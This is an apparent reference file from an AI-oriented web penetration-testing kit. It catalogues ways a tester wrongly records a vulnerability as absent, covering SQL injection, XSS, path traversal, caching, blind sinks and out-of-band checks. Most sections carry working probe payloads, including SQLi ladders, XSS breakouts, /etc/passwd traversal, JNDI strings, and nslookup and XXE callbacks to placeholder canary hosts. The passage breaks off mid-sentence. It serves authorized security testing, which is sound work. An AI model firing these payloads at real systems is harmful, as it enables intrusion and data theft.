# Reference — False Negatives

A missed bug is always a false negative. Something looked clean and was not. This file is the catalog of
clean-looking results that are wrong, and the test that tells the two apart.

Numbering is §F.x. `2.x` is `00-surface-and-ledger.md`, `3.x` is `01-injection.md`, `4.x` is
`02-info-disclosure.md`, `B.x` is `03-bypass-and-blind.md`. Anti-miss rules are `../CLAUDE.md` 6.n.

**When to open this file.** Every time you are about to write `tested-negative`. That is the only moment it
matters. Run §F.9 first; if any answer is "no" or "did not check", the row is not negative yet.

**What is not in here.** Payloads, tool syntax, bypass encodings. Those live in the cards. This file only
carries the reasoning failures — the places where a correct-looking observation leads to the wrong state.

Every entry has the same four parts:

- **Observed** — the thing that looks like a negative.
- **Why it is wrong** — the mechanism.
- **Disambiguate** — a literal test, and what each outcome means.
- **Ledger** — the state the row actually takes.

Where a behaviour is version-, driver- or config-specific it says "verify on target" and gives the check.
Do not convert a hedge into an assertion when you write it up.

---

## F.1 Partial mitigation read as full mitigation

The whole class: you proved *one* path is safe and recorded it as if you had proved the sink is safe. A
defence you can see is evidence that the developer knew about the risk on that path, and nothing at all
about the path next to it.

### F.1.1 A bound value next to an unbindable identifier

**Observed.** `?filter[env]=' OR 1=1` and `{"labels":[{"key":"env","value":"te'st"}]}` both return clean
200s. The value is clearly parameterised — quotes come back intact, no error, no length change.

**Why it is wrong.** The value is the one part of that statement a driver *can* bind. Column names, table
names, `ORDER BY` targets, JSON/JSONB paths and document field names cannot be bound by any driver in any
language. If the endpoint accepts user-defined keys, the key is structurally forced into the statement text.
A bound value means the developer used a parameterised API and then had to concatenate everything that API
refused to take. That is evidence *for* injection in the key position (3.1 high-yield vector).

**Disambiguate.** Run the parity ladder on the **key**, not the value, and with the quote character the
identifier context uses (see F.5.4):

```
filter[env]=prod            baseline
filter[env']=prod           odd
filter[env'']=prod          even
filter[env"]=prod           double-quote identifier variant
filter[env`]=prod           MySQL backtick variant
filter[env]]=prod           MSSQL bracket variant
filter[(select 1)]=prod     expression in identifier position
```

| Outcome | Meaning |
|---|---|
| Any quote family alternates error/clean/error | key is concatenated → `suspicious`, boolean pair next (3.1) |
| Error on every key that is not a real column, identical shape | server-side allow-list of columns → F.1.6 before you call it negative |
| Unknown-column error that echoes your key verbatim | concatenated, and you have an error oracle (4.20) |
| Key silently ignored, response identical to baseline | key is dropped before the query — F.3, not a negative |

**Ledger.** Key and value are separate rows, always. A negative on the value row never propagates to the key
row. The key row stays `untested` until it has its own payload and response recorded (6.1, 6.2).

### F.1.2 Prepared statement with `LIMIT` / `OFFSET` / `ORDER BY` concatenated

**Observed.** You read source (from a source map, 4.6) or you tested the `WHERE` filter and it is bound. The
code says `prepare(...)`, `?` placeholders, the lot.

**Why it is wrong.** Pagination and sort are the standard exceptions. `ORDER BY <col>` cannot be bound
anywhere. `LIMIT ?` is accepted by some server-side prepare paths and rejected by client-side emulation
(PDO with emulation quotes the bound value, producing `LIMIT '10'`, which errors) — so developers concatenate
it. The safe `WHERE` and the concatenated `LIMIT` are in the same query string.

**Disambiguate.** Attack the pagination and sort parameters as their own rows:

```
limit=1                     baseline
limit=1x                    -> type error (bound/cast) vs SQL syntax error (concatenated)
limit=0x1                   -> MySQL hex literal; a row returned means the DB parsed it
limit=1,1                   -> MySQL two-arg LIMIT accepted = raw string
offset=1-1                  -> record shifts = arithmetic evaluated server-side
sort=id                     baseline order
sort=(case when 1=1 then id else name end)
sort=id--
sort=id/**/desc
```

Order-changed is the oracle here: `ORDER BY` injection often produces no error at all, just a different row
order. Compare the first three IDs of the list, not the response length.

**Ledger.** `limit`, `offset`, `page`, `per_page`, `sort`, `order`, `dir`, `fields`, `cols` each get their own
SQLi row even when the search field next to them is clean.

### F.1.3 PDO / mysqli "prepared" but emulation is on

**Observed.** PHP source shows `$pdo->prepare($sql); $stmt->execute([$v]);`. You mark the endpoint safe by
inspection.

**Why it is wrong.** With `PDO::ATTR_EMULATE_PREPARES` on, PDO builds the final statement string in the
client library by quoting your value itself. Two consequences: the quoting depends on the connection charset,
and multi-statement behaviour differs from a server-side prepare. If the connection charset was set with a
`SET NAMES` query instead of in the DSN, the client's idea of the charset and the server's can disagree, and
in a multibyte charset (GBK, Big5, SJIS) a crafted lead byte can consume the escaping backslash. Exact
behaviour is version- and charset-specific — verify on target, do not assert it in a report.

**Disambiguate.** Send the multibyte prefix probes as a pair and diff:

```
%bf%27 OR 1=1-- -
%81%27 OR 1=1-- -
%a1%27 OR 1=1-- -
```

A 500, a SQL syntax error, or a boolean difference against the `%bf%22` control means the escaping was
consumed. Nothing happening means nothing about the rest of the query. Also check whether the response body
shows a literal `\'` anywhere — that says client-side escaping, not binding.

**Ledger.** Source review alone is never a negative. `tested-negative` needs a payload and a response (6.2).
Reading `prepare()` in a bundle is a note, not a result.

### F.1.4 ORM parameterises `filter()` and not the raw escape hatch

**Observed.** The stack is Django/Rails/Spring Data/EF Core. Values are bound. Injection "cannot happen
through an ORM".

**Why it is wrong.** Every ORM ships an escape hatch and every real app uses it for reports, sorting and
aggregation. The bound path and the raw path are often the same endpoint with different parameters.

| Stack | Bound | Raw or unvalidated — verify in recovered source |
|---|---|---|
| Django | `filter()`, `get()`, `exclude()` | `.extra(where=/select=/order_by=)`, `.raw()`, `RawSQL()`, `annotate(x=RawSQL(...))`, `.values_list(*cols)` with user columns |
| Rails | `where(hash)`, `where("x = ?", v)` | `where("x = '#{v}'")`, `select`/`pluck`/`group`/`having`/`from` with a raw string, `order(Arel.sql(v))`, `exists?("...")` |
| Spring Data JPA | derived queries, `@Query` with `:params` | `@Query(nativeQuery=true)` with concat, `Pageable`/`Sort` appended to a native query, `JpaSort.unsafe(...)` |
| Node | Sequelize `where: {a: v}`, knex `where` | `sequelize.literal()`, `sequelize.query` with template strings, `whereRaw`, `orderByRaw`, `joinRaw` |
| .NET | Dapper parameters, EF LINQ | `FromSqlRaw`, `ExecuteSqlRaw`, string-built `OrderBy`, Dynamic LINQ string expressions (expression injection, not SQLi — verify on target) |
| PHP/Laravel | Eloquent `where` | `DB::raw`, `whereRaw`, `orderByRaw`, `selectRaw`, `havingRaw` |

Rails 6+ raises on a raw `order`/`pluck` argument unless it is wrapped in `Arel.sql`, so a clean `order` test
on Rails is expected and tells you nothing about `select`, `group`, `having` or `from`.

**Disambiguate.** Find the endpoints that *report* rather than list: `/export`, `/report`, `/analytics`,
`/dashboard`, `?group_by=`, `?aggregate=`, `?metrics=`, `?having=`, `?cols=`. Those are where the escape
hatch lives. Probe the grouping and column parameters with F.1.1's key ladder.

**Ledger.** "It is an ORM" is not a payload. Rows for report/aggregate/sort parameters stay open even when
the CRUD endpoints are clean.

### F.1.5 Parameterised outer call, dynamic SQL inside the procedure

**Observed.** The parity ladder gives clean / error / clean — the *even* count errors and the odd counts do
not. Or you can see the app calls a stored procedure with bound parameters.

**Why it is wrong.** The outer call is bound. Inside, the procedure concatenates the parameter into a string
and runs `EXEC`/`sp_executesql`/`EXECUTE IMMEDIATE`. Your input is escaped once on the way in and then
re-parsed. Doubling a quote now *creates* the break instead of fixing it, which is why the ladder inverts.

**Disambiguate.** Escalate the ladder one level of escaping:

```
test'            test''           test''''
test\'           test\\'
%2527            %252527
```

An inverted or shifted parity (break on even, or break only at four quotes) is a second parsing layer.
Then confirm with a boolean pair carrying the same doubling: `'' AND ''1''=''1` versus `...=''2`.

**Ledger.** `suspicious`, and note "double-parse suspected" with the ladder outcomes. B.3 layer 1 for the
encoding work.

### F.1.6 Allow-list on the sink, raw everywhere else

**Observed.** `sort=anything_not_a_column` returns a clean 400 with a generic message. The column is
validated against a list. Row closed.

**Why it is wrong.** The validation protects the query. The rejected value still travels: into the error
message, into the audit log, into a metrics label, into a cache key, into the SQL of the *count* query that
runs before validation, or into a second endpoint that shares the parameter name and not the validator.

**Disambiguate.**
```
# does the rejection echo your value?
sort=zz<svg/onload=alert(1)>zz        -> reflected in the 400 body = XSS/HTML row, not closed
sort=${jndi:ldap://r0142-q-jndi.01.CANARY/x}   -> log sink (3.18), OOB only
sort=zz%0d%0aX-Canary:1              -> CRLF into a log line or header (3.12)
# does another transport share the name?
GET /api/v2/...?sort=...   POST /api/export {"sort":"..."}   GraphQL orderBy.field
```

**Ledger.** SQLi row on this vector may go negative with the allow-list recorded as the evidence. The log
injection, XSS-in-error and second-transport rows are separate and still `untested`.

### F.1.7 Escaped on write, raw on the second read

**Observed.** You store `O'Brien` (or `<b>x</b>`) and the record view renders it correctly. Escaping works.

**Why it is wrong.** Escaping applied at write time produces a stored value that is *already* escaped
(`O\'Brien`, `&lt;b&gt;`). The bug appears when a second code path reads the stored value out and builds a
new statement or a new document with it — a nightly report, a search-index update, a de-duplication query, a
migration, an admin filter. That path gets a string containing a quote and no escaping, because "it came from
the database, it is trusted".

**Disambiguate.** Read the raw stored bytes back through the API first, then look for a consumer:

```bash
# what is actually stored?
curl -sS -H 'Cookie: session=...' 'https://TARGET/api/me' | jq -r '.lastName' | xxd | head
```

| Stored form | What it tells you |
|---|---|
| `O'Brien` (raw quote) | stored raw; any downstream concatenation is live → hunt consumers |
| `O\'Brien` | escaped at write; the escape travels into the next query → second-order SQLi candidate |
| `O&#39;Brien` | HTML-escaped at write; will double-escape or be decoded downstream (F.6.5) |

Then store `payload' AND 1=1-- r0210` in a field a report reads, and diff the report against the same field
with `...1=2`. 3.21 for the render-site loop.

**Ledger.** A clean first-order render is a negative for *that renderer only*. The second-order row is its
own row and cannot inherit it (6.7).

### F.1.8 Sanitiser runs before the normaliser

**Observed.** `../` is stripped. `<script` is stripped. The filter obviously works — your payload comes back
mangled.

**Why it is wrong. Order matters.** If the code strips first and decodes, resolves, or normalises second,
the strip ran against a form of your payload that is not the form the sink sees. Classic orders:
strip `../` then URL-decode; strip tags then HTML-entity-decode; strip then Unicode-normalise (NFKC turns
fullwidth and other lookalikes into ASCII); strip then `realpath`.

**Disambiguate.** Send the payload in a form that is harmless *before* normalisation and hostile after:

```
..%2f..%2f..%2fetc/passwd          single-encoded slash
..%252f..%252fetc/passwd           double-encoded
.%2e/.%2e/etc/passwd               encoded dot
..%c0%af..%c0%afetc/passwd         overlong UTF-8 (verify the parser accepts it)
&lt;script&gt;alert(1)&lt;/script&gt;    entity-encoded, decoded after filtering
＜script＞alert(1)＜/script＞        fullwidth, NFKC-normalised to ASCII
%EF%BC%9Cscript%EF%BC%9E           same, percent-encoded
```

If any variant reaches the sink intact, the filter runs in the wrong order. B.3 layers 2 and 3.

**Ledger.** A mangled echo is not a negative. The row is negative only when the *normalised* forms were also
tried and recorded.

### F.1.9 HTML-encoded for the body, not for the context it lands in

**Observed.** `<` and `>` come back as `&lt;` `&gt;`. The value is encoded. XSS closed.

**Why it is wrong.** The encoder is context-blind. `htmlspecialchars($v)` without `ENT_QUOTES` leaves single
quotes intact (verify the flags in recovered source), which is enough to break out of `attr='...'`. Nothing
in an HTML encoder helps inside `<script>`, inside an event handler, inside `href=`/`src=`/`formaction=`
(where `javascript:` needs no angle brackets at all), inside a CSS `url()`, or inside a JSON blob that the
page hands to `innerHTML`.

**Disambiguate.** Find the context first — view source, locate your value, then pick the payload:

| Where your value landed | Probe | Needs |
|---|---|---|
| `value='HERE'` | `x' autofocus onfocus=alert(1) x='` | `'` only |
| `value="HERE"` | `x" autofocus onfocus=alert(1) x="` | `"` only |
| `<script>var a='HERE'</script>` | `';alert(1);//` | `'` and newline handling |
| `<script>var a=\`HERE\`</script>` | `${alert(1)}` | `$` `{` `}` only |
| `href="HERE"` | `javascript:alert(1)` | no special chars |
| `onclick="f('HERE')"` | `');alert(1);//` | `'` after HTML decode — the attribute decodes once |
| JSON in a `<script type=application/json>` | `</script><svg onload=alert(1)>` | `<` `/` |

**Ledger.** One encoded probe in one context closes nothing. Record which context your value landed in; if
you did not determine the context, the row is `untested`.

---

## F.2 The response looked identical

Diff detection needs a trustworthy diff. Most of these are failures of the comparison, not of the payload.

### F.2.1 No control request — the soft 404

**Observed.** `GET /.git/config` returns 200, or every path returns the same 404 and you conclude the
directory does not exist. Either reading is unfounded.

**Why it is wrong.** An SPA catch-all, a rewrite rule, or a framework 404 handler answers everything with the
same status and a same-length body. Without a control you cannot tell "this path exists" from "this server
answers everything".

**Disambiguate.** Always send a name that cannot exist, in the same directory, same request shape:

```bash
for p in /.git/HEAD /.git/HEADzzz /.env /.envzzz /actuator/health /actuator/healthzzz; do
  printf '%s ' "$p"
  curl -sS -o /tmp/claude-0/b.$$ -w '%{http_code} %{size_download} %{content_type}\n' \
    -H 'X-Bug-Bounty: HANDLE' "https://TARGET$p"
done
```

| Result | Meaning |
|---|---|
| Hit and control differ in status, length or content-type | the hit is real |
| Hit and control identical | the result is meaningless — no information either way |
| Both 200 with `text/html` and the app's shell | you fetched the SPA index, not the file (F.7.2) |

**Ledger.** Identical to control = `untested`, not `tested-negative`. Record the control in `Notes`, as in the
example row in `02-info-disclosure.md` 4.2.

### F.2.2 The payload never reached the app — cached or edge-generated response

**Observed.** Every payload variant returns the same 403, or the same 200, byte for byte, instantly.

**Why it is wrong.** A CDN or WAF answered. Either it blocked (6.6, so not a negative) or it served a cached
copy, in which case your payload was never evaluated by the application at all. A cached response to your
*first* probe poisons every probe after it.

**Disambiguate.**
```bash
# 1. is it cache?  look for these on the "identical" response
curl -sSD - -o /dev/null 'https://TARGET/api/search?q=test' | grep -iE 'age:|x-cache|cf-cache-status|x-served-by|via:'
# 2. bust the cache on every probe and re-diff
curl -sS "https://TARGET/api/search?q=test'&cb=$RANDOM"
# 3. is the block at the edge? a payload on a path that cannot exist
curl -sS -o /dev/null -w '%{http_code}\n' "https://TARGET/zzzz-nope?q=1%27%20OR%201=1"
```

Timing is the cheap tell: an edge response is usually far below the app baseline from 2.4. A 403 in 12ms when
the app answers in 120ms did not touch the app.

**Ledger.** Cached or edge-served → `suspicious` and jump to B.2 to identify the blocker. Never negative.

### F.2.3 One patched node, one unpatched node

**Observed.** A payload produced a 500 once. You re-sent it, got a clean 200, decided the 500 was noise.

**Why it is wrong.** Behind a load balancer, backends drift: different build, different config, different
`display_errors`, one with the fix deployed. A 1-in-N difference is a real signal, and re-testing once is
exactly how you lose it.

**Disambiguate.**
```bash
# same probe 10 times, print status/length and any node identifier
for i in $(seq 10); do
  curl -sSD /tmp/claude-0/h.$$ -o /dev/null -w '%{http_code} %{size_download} ' "https://TARGET/api/x?id=1%27"
  grep -ihE 'x-served-by|x-backend|x-node|server:|x-powered-by|set-cookie' /tmp/claude-0/h.$$ | tr '\n' ' '; echo
done
```

Rotate nodes deliberately: drop any sticky/affinity cookie (`AWSALB`, `BIGipServer*`, `JSESSIONID` route
suffix, `X-Served-By` hints), or reconnect rather than reuse the connection (`curl -H 'Connection: close'`).
Stay inside the rate limit — 10 requests, not 200.

**Ledger.** Any non-uniform response across identical requests is `suspicious` with the sample recorded. Note
the node identifier so the finding is reproducible ("reproduces on the backend that sets `X-Served-By: web-03`").

### F.2.4 The differential exists in data you did not ask for

**Observed.** `AND 1=1` and `AND 1=2` return byte-identical responses on a list endpoint. Or the endpoint
returns `{"ok":true}` regardless.

**Why it is wrong.** Your boolean may be affecting a part of the query whose result is not in the projection
you are looking at: a count, an aggregate, a facet, a second page, a sort order, a header. Or the endpoint is
a write that returns a fixed envelope and the read happens elsewhere.

**Disambiguate.** Ask for a channel that can move:

```
&include=totalCount        &meta=1        &withCount=true
&per_page=1                             -> page size 1 makes one-row differences visible
&sort=id&per_page=3                     -> compare the first 3 IDs, not the length
GraphQL: add totalCount / pageInfo { hasNextPage } to the selection set
Range/Link/X-Total-Count response headers
HEAD request -> compare Content-Length and ETag only
```

If nothing in the response can vary, use the order oracle (`ORDER BY` you control changes row order) or the
error oracle (`1/1` vs `1/0`, no data touched), per B.8.

**Ledger.** "Responses identical" with only one projection tried is `untested`. Name the channel you used in
the evidence.

### F.2.5 Framing hid the length delta

**Observed.** `Content-Length` is the same for both halves of your boolean pair, or absent entirely.

**Why it is wrong.** Three separate mechanisms:
- gzip/br: a few plaintext bytes of difference can compress to the same number of bytes.
- chunked transfer or HTTP/2: no `Content-Length` at all, so a length-based diff silently compares nothing.
- The body contains per-request noise (CSRF token, request ID, timestamp, nonce) that swamps a small delta.

**Disambiguate.**
```bash
# ask for no compression, measure the decoded body, hash it after stripping noise
curl -sS --http1.1 -H 'Accept-Encoding: identity' 'https://TARGET/api/x?id=1+AND+1%3D1' \
  | tee /tmp/claude-0/t.txt | wc -c
curl -sS --http1.1 -H 'Accept-Encoding: identity' 'https://TARGET/api/x?id=1+AND+1%3D2' \
  | tee /tmp/claude-0/f.txt | wc -c
# normalise the noise before diffing
sed -E 's/[0-9a-f]{16,}//g; s/[0-9]{10,}//g' /tmp/claude-0/t.txt > /tmp/claude-0/t.n
sed -E 's/[0-9a-f]{16,}//g; s/[0-9]{10,}//g' /tmp/claude-0/f.txt > /tmp/claude-0/f.n
diff /tmp/claude-0/t.n /tmp/claude-0/f.n && echo IDENTICAL
```
For JSON, normalise key order too: `jq -S .` both sides before diffing.

**Ledger.** A length comparison made on a compressed or chunked response is not evidence. Redo it before the
row can go negative.

### F.2.6 The error was swallowed into a success envelope

**Observed.** Broken SQL returns `200 {"success":false}` or `200 {"data":null}`, exactly like an ordinary
empty result.

**Why it is wrong.** A global exception handler maps every failure to one shape. The DB error happened; you
just cannot see it. GraphQL does this by specification — the HTTP status is 200 and the failure is in
`errors[]`, which a status-only check misses entirely.

**Disambiguate.**
```bash
# GraphQL: always read errors[], never the status
curl -sS -X POST -H 'Content-Type: application/json' \
  -d '{"query":"{assets(labels:[{key:\"a'\''\",value:\"b\"}]){id}}"}' \
  'https://TARGET/graphql' | jq '{data, errs:[.errors[]?|{message, path, ext:.extensions}]}'
```
Then separate "no rows" from "query failed" with a probe that cannot return rows but also cannot fail:
`' AND 1=2-- -` (valid SQL, zero rows) versus `' AND 1=-- -` (invalid SQL). If both give the identical
envelope, the handler is swallowing — look for the error in a side channel instead: the in-app audit log or
notification list, a `X-Request-Id` you can look up, timing (a failed query returns faster than a full table
scan), or `Retry-After`/`Set-Cookie` differences.

**Ledger.** `suspicious` if the invalid-SQL probe is indistinguishable from the zero-rows probe: that means
you have no error channel yet, not that there is no error. 4.20 for turning errors into a channel.

### F.2.7 You compared against the wrong baseline

**Observed.** Every probe in a long run returns the same length and status. Beautifully consistent negatives.

**Why it is wrong.** Consistency across a whole run usually means the session died, the CSRF token expired, or
a rate limiter kicked in at request 30 — and every "negative" after that is a login page, a 401, or a 429. The
baseline from 2.4 was captured authenticated; the run was not.

**Disambiguate.**
```bash
# re-assert the auth context at the end of every batch, not just the start
curl -sS -o /dev/null -w 'whoami=%{http_code} len=%{size_download}\n' \
  -H 'Cookie: session=...' 'https://TARGET/api/me'
# and grep the saved run output for the tells
grep -ciE 'sign in|log in|csrf|session expired|429|too many requests' /path/to/run-output
```

**Ledger.** Any row tested after the last successful auth check, with no auth check in between, is `untested`.
Re-run it. This is the cheapest way to fake a whole ledger by accident.

---

## F.3 The payload never arrived

A negative means "the sink saw my payload and did nothing". If the payload did not reach the sink you learned
nothing about the sink — you learned about the layer in front of it. That layer is worth recording, and it is
a different row.

### F.3.1 Framework validation rejected it before the sink

**Observed.** `/api/user/1'` returns 404. Non-numeric input always 404s. You write "route validates `^\d+$`".

**Why it is wrong.** That part is probably right, and it is still not a negative for the sink — it is a
negative for *this transport*. The same identifier reaches the same query from other transports that do not
share the constraint: a bulk endpoint (`ids=1,2,3` joined into `IN (...)`), a body field, a GraphQL argument
typed `String`, an export filter, a header the app trusts. Type constraints also differ per framework: a
Spring `@PathVariable Long` rejects, but `@RequestParam String` next to it does not; a GraphQL `ID` scalar
accepts arbitrary strings; a JSON body field typed `number` in a DTO may still accept `"1 AND 1=1"` if the
binder coerces loosely (verify on target).

**Disambiguate.** First prove *where* the rejection happens, then find the other transport.

```bash
# route-level vs query-level: compare timings and bodies of three cases
curl -sS -o /dev/null -w 'valid    %{http_code} %{time_total} %{size_download}\n' 'https://TARGET/api/user/1'
curl -sS -o /dev/null -w 'missing  %{http_code} %{time_total} %{size_download}\n' 'https://TARGET/api/user/999999999'
curl -sS -o /dev/null -w 'bad-type %{http_code} %{time_total} %{size_download}\n' "https://TARGET/api/user/1%27"
```

| Pattern | Meaning |
|---|---|
| bad-type is much faster than missing, different body | rejected before the DB → route/DTO validation |
| bad-type timing ≈ missing timing, same 404 body | the value reached a query that returned nothing → keep probing, numeric-context payloads (F.5.1) |
| bad-type 400 with a field name and expected type | binder rejected → note the type, attack the loose transports |

Then enumerate the alternative transports for the same value:
```
GET  /api/users?ids=1,2,3            POST /api/users/bulk {"ids":["1"]}
POST /api/export {"filter":{"userId":"1"}}
GraphQL: user(id:"1"), users(ids:["1"]), node(id:"...")
path suffix tricks: /api/user/1.json  /api/user/1;a=b  /api/user/1%2f
```

**Ledger.** This row can go `tested-negative` *with the constraint recorded as the evidence*, exactly like
`R0004` in `../templates/coverage.md`. The alternative-transport rows are new rows, `untested`, added per 2.6.
Never let one route constraint close the sink.

### F.3.2 A proxy normalised the payload away

**Observed.** Traversal payloads never work anywhere. `%2e%2e%2f` behaves exactly like `../`. Encoded slashes
vanish.

**Why it is wrong.** The reverse proxy rewrote the request before the app saw it: path segments collapsed,
`//` merged, `%2f` decoded (or rejected), dot segments resolved, duplicate headers joined, `%00` stripped.
Your payload was tested against the proxy, not the app.

**Disambiguate.** Move the same payload to a position the proxy does not normalise, and compare:

```
path:    /files/..%2f..%2fetc/passwd
query:   /files?name=..%2f..%2fetc/passwd
body:    {"name":"../../etc/passwd"}
header:  X-Original-URL: /files/../../etc/passwd
```

If the query or body version behaves differently from the path version, normalisation is happening in front.
Confirm what the app received using any echo you have: an error message that quotes the filename, a
`Content-Disposition` header, an upload listing, the in-app log viewer. B.4 "Path normalisation differences".

**Ledger.** Path-position row: `suspicious`, with the note that the edge normalises. Query/body/header
positions are separate rows.

### F.3.3 The edge overwrote the header you injected into

**Observed.** `X-Forwarded-For: <payload>` produces nothing on any sink, ever. Same for `X-Real-IP`, `Host`,
`X-Forwarded-Host`.

**Why it is wrong.** CDNs and load balancers own those headers. Many overwrite `X-Forwarded-For` with the real
client IP, or append to it, or normalise it to an IP list and drop anything unparseable. Others consume
`X-Original-URL`/`X-Rewrite-URL` at the edge. The app never received your string.

**Disambiguate.** Find out what the app actually received before testing sinks. Cheap echo sources:

```
a "last login IP" / "recent devices" / session list view in the UI
an audit-log entry that records the IP
an error page or debug endpoint that dumps headers (4.7, 4.8)
an email the app sends you containing the IP or user agent
```
Put a plain canary (no payload syntax) in the header first: `X-Forwarded-For: 1.2.3.4, r0142-canary`. If the
canary never appears anywhere, the header is not reaching the app or not stored — switch to a header the edge
does not touch (`User-Agent`, `Referer`, `Accept-Language`, `X-Requested-With`, a custom `X-*` you found in a
JS bundle) and re-test.

**Ledger.** Header row is `untested` until you can show the app received *something* you sent in that header.
Record which headers the edge rewrites once, in `notes.md` — it applies to every row.

### F.3.4 A length cap truncated the payload mid-statement

**Observed.** A long payload produces a validation error or a generic failure. A short probe produces nothing.
Field looks filtered.

**Why it is wrong.** A `varchar(32)` column, a DTO `@Size`, or a JS `maxlength` mirrored server-side cut your
payload. Truncated SQL is invalid SQL, so you see an error and read "filter". Truncated template syntax is
inert, so you see nothing and read "not vulnerable". Either way the sink was never exercised with a valid
payload.

**Disambiguate.** Find the cap, then fit the payload inside it.

```bash
# find the cap: store increasing lengths and read back what survived
for n in 8 16 32 64 128 255; do
  python3 -c "print('A'*$n+'#END')" > /tmp/claude-0/v.txt
  # POST it, then GET the record and measure the stored length
done
```
Short payloads that still prove the sink:
```
SQLi     1-1          '||'a        1/0        ' AND 1=1#
SSTI     ${7*7}       {{7*7}}      #{7*7}     <%=7*7%>
XSS      <svg onload=alert(1)>     '"><img src=x onerror=alert(1)>
cmd      `id`         $(id)        |id
OOB      short collaborator label: r1-q.CANARY  (keep the marker tiny, B.7)
```

**Ledger.** If the stored value is shorter than what you sent, the row is `untested` — you have not yet tested
the sink, you have tested the column width. Record the cap in `Notes`.

### F.3.5 Charset conversion ate the payload

**Observed.** A payload containing multibyte characters, emoji, or an unusual encoding disappears or arrives
mangled. Everything after a certain character is gone.

**Why it is wrong.** A 3-byte `utf8` MySQL column silently drops a 4-byte character and, depending on strict
mode, truncates the rest of the value (verify on target). `iconv`-style transliteration can rewrite quotes to
lookalikes. A `latin1` connection to a `utf8mb4` column mangles bytes. Your payload was altered in transit, so
its failure says nothing.

**Disambiguate.** Store a marker string that makes the conversion visible, then read it back raw:

```bash
printf 'A\xf0\x9f\x92\xa9B%%27C\xc2\xa0D' > /tmp/claude-0/cs.bin   # emoji, quote, NBSP
# POST it, then:
curl -sS -H 'Cookie: session=...' 'https://TARGET/api/me' | jq -r '.field' | xxd | head
```
If `B` onward is missing, you have found truncation-on-invalid-character, which is itself worth a note. Re-test
the sink with a pure-ASCII payload before drawing any conclusion.

**Ledger.** `untested` until a payload arrives byte-intact. Also flag it: a field that truncates at a
multibyte boundary is a filter-bypass primitive (B.3 layer 2) for *other* rows.

### F.3.6 The transport you tested is not the transport the app uses

**Observed.** Every raw GraphQL query returns `400 PersistedQueryNotFound` or `403`. Or a JSON body gets a
415. You conclude the endpoint is locked down.

**Why it is wrong.** With persisted/allow-listed GraphQL operations the server only accepts a hash of a known
document — arbitrary queries are refused regardless of vulnerability. The vulnerable code is still reachable
through the *variables* of an allowed operation. Same shape of error for API gateways that validate against an
OpenAPI schema: unknown fields are rejected, known fields are not.

**Disambiguate.** Get the legitimate operation and inject into its variables.

```bash
# operation hashes and full documents live in the JS bundles
jsluice urls -R /path/to/bundle.js | head
grep -oE '"(sha256Hash|operationName|documentId)":"[^"]+"' /path/to/bundle.js | sort -u | head
grep -oE '(query|mutation)[[:space:]]+[A-Za-z0-9_]+[[:space:]]*\([^)]*\)' /path/to/bundle.js | sort -u | head
```
Then replay the allowed operation with hostile variables:
```json
{"operationName":"AssetSearch","extensions":{"persistedQuery":{"version":1,"sha256Hash":"<hash>"}},
 "variables":{"input":{"labelFilter":[{"key":"env'","value":"prod"}]}}}
```
Also try the automatic-persisted-query registration path (send `query` plus the matching hash) — some servers
accept it, which gives you arbitrary queries back. Verify on target.

**Ledger.** `untested`. A transport-level rejection is not a sink result. Note "persisted queries only; inject
via variables" so the next pass does not repeat the mistake.

---

## F.4 Wrong channel, not absent vulnerability

`../CLAUDE.md` 6.8 as a set of concrete failures. The sink fired; the evidence went somewhere you were not
looking.

### F.4.1 No reflection and no timing, no callback attempted

**Observed.** The endpoint returns `204` or a fixed envelope. Nothing reflects. Timing is flat. Row closed as
negative.

**Why it is wrong.** That is the definition of a blind sink, not the definition of a safe one. Half of
command injection, most log injection, most SSRF and all deserialization sinks look exactly like this when
they work.

**Disambiguate.** One request per sink family carrying a DNS callback with a row-identifying label
(B.7 scheme, 3.23 discipline):

```
cmd      ;nslookup r0311-j-cmd.01.CANARY   |nslookup ...   `nslookup ...`   $(nslookup ...)
SSRF     http://r0311-j-ssrf.01.CANARY/
JNDI     ${jndi:ldap://r0311-j-jndi.01.CANARY/x}
SSTI     {{''.__class__}}  plus an engine-specific OOB form from 3.4
XXE      <!ENTITY % e SYSTEM "http://r0311-x-xxe.01.CANARY/d.dtd">  (OOB DTD, never a billion-laughs)
SQL      MSSQL xp_dirtree / Oracle UTL_HTTP forms in B.7
```

**Ledger.** Blind sink with no callback attempted = `suspicious`, never `tested-negative`. The row may only go
negative after a callback attempt on a *working* channel — which F.4.3 makes you prove.

### F.4.2 The sink fires hours later, in a batch job

**Observed.** You stored the payload, walked the render sites, watched the listener for ten minutes, saw
nothing. Negative.

**Why it is wrong. This is the most-missed timing class in the kit.** Nightly digests, weekly reports,
invoice runs, search reindex, virus scan, thumbnailing, data-warehouse ETL, log shipping, backup export and
admin summary mails all run on a schedule. The render happens at 02:00, in a different process, often with a
different template engine and no escaping.

**Disambiguate.** Make the canary carry its own timestamp so a late hit is attributable, and schedule the
re-check.

```
marker format: r<row>-<vector>-<sink>-<YYYYMMDDHHMM>
example:       r0311-j-ssti-202609251412.CANARY
payload:       {{7*7}}<!--r0311-202609251412-->
```
```bash
# keep the listener running and logged to disk, not scrollback
interactsh-client -json -o /root/pentest/targets/TARGET/evidence/oob.log
# next day, grep by marker, not by eye
grep -a 'r0311' /root/pentest/targets/TARGET/evidence/oob.log
# and re-walk the stored-value render sites (3.21 table) after each scheduled boundary
```
Also force the schedule where the app lets you: request the export/report manually, trigger the digest from
notification settings, change the record state (submit → approve → publish), or wait for the boundary you can
name (end of day, end of month).

**Ledger.** Rows whose only channel is a batch job stay `suspicious` with an explicit "recheck after
<timestamp>" note. Do not close them at the end of the session; close them the next day or hand them over as
open in the coverage count.

### F.4.3 Egress is blocked, so every OOB channel fails silently

**Observed.** No callback for anything, on any sink, all session. You conclude the app is clean.

**Why it is wrong.** You cannot tell "no vulnerability" from "no egress" without proving the channel works.
Also: interactsh and similar collaborator domains are categorised by some enterprise DNS filters, so the
resolution can be blocked by policy for *every* payload regardless of the bug.

**Disambiguate.** Use a legitimate feature of the app as your egress test before trusting any OOB negative:

```
avatar-from-URL / "import image from link"      -> does it fetch your host?
webhook registration                            -> does it POST to your host?
"send test notification" / SSO metadata URL      -> does it resolve your host?
PDF/HTML-to-image renderer with an <img src>     -> does it fetch?
```

| Result | Meaning |
|---|---|
| DNS query arrives and HTTP arrives | full egress → OOB negatives are meaningful |
| DNS query arrives, no HTTP | DNS-only egress → use DNS payloads only; an HTTP-only payload was never a fair test |
| Nothing arrives at all | no egress, or your collaborator domain is filtered. Retry with a different domain you control; if still nothing, OOB is unavailable and inference is the only channel (B.8) |

**Ledger.** With no proven egress, every blind row is `suspicious` + "no OOB channel available on this target;
